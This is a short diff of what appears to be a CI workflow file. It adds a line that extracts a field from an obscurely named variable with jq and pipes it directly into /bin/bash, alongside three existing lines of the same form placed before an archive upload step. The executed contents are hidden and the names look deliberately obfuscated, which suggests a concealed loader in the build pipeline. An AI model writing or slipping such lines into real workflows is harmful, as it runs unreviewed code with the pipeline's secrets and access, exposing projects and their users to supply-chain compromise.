@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$meruh6" | jq -r .o889 | /bin/bash
           echo $fadyx04 | jq -r .oqafw6 | /bin/bash
           printf '%s' "$iul00275" | jq -r .t49826 | /bin/bash
+          echo $hffz917 | jq -r .xrz2 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
